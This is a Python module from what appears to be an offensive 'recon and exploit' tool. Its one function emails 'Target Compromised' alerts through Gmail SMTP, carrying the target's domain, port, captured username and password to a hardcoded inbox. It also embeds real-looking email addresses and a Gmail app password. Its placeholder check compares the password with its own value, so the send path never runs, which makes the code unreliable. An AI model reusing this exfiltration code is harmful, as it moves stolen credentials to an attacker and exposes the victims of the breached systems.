import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import sys

def send_breach_alert(target, hit_details):
    """
    Transmits an encrypted SMTP alert containing verified breach intelligence 
    directly to your inbox, displaying real-time telemetry on the terminal screen.
    """
    # Configuration parameters
    smtp_server = "smtp.gmail.com"
    port = 465
    sender_email = "blessedresult6@gmail.com"
    receiver_email = "dennisbed1234@gmail.com"
    
    # Placeholder for your Google App Password (Generate via Google Account -> Security -> App Passwords)
    app_password = "tsal stxo zsko kjvc"

    if app_password == "tsal stxo zsko kjvc":
        print(f"\033[93m[-] WARNING: Google App Password not set in modules/mail.py. Skipping email alert dispatch.\033[0m")
        return False, "App password placeholder active."

    # Constructing email payload
    message = MIMEMultipart("alternative")
    message["Subject"] = f"[+++] RED TEAM ALERT: Target Compromised -> {target}"
    message["From"] = sender_email
    message["To"] = receiver_email

    text = f"""
    [NEURAL RECON & EXPLOIT ENGINE - AUTOMATED BREACH NOTIFICATION]
    
    Target Domain : {target}
    Vector Type   : {hit_details.get('type', 'N/A')}
    Target Port   : {hit_details.get('port', 'N/A')}
    Username      : {hit_details.get('user', 'N/A')}
    Password/Key  : {hit_details.get('password', 'N/A')}
    Timestamp     : {hit_details.get('timestamp', 'N/A')}
    
    Artifacts have been safely dumped to reports/dumps/ locally on mobile terminal.
    """

    message.attach(MIMEText(text, "plain"))

    print(f"\n\033[95m[mail.py] Initializing secure TLS/SSL socket connection to {smtp_server}:{port}...\033[0m")

    try:
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
            server.login(sender_email, app_password)
            server.sendmail(sender_email, receiver_email, message.as_string())
        
        # Display transmission results on terminal screen after completion
        print(f"\033[92m[+] SUCCESS: Breach notification packet dispatched via email!\033[0m")
        print(f"    ├── From: {sender_email}")
        print(f"    └── To  : {receiver_email}\n")
        return True, "Alert sent successfully."
        
    except Exception as e:
        print(f"\033[91m[!] ERROR: Failed to transmit email alert: {e}\033[0m")
        return False, str(e)
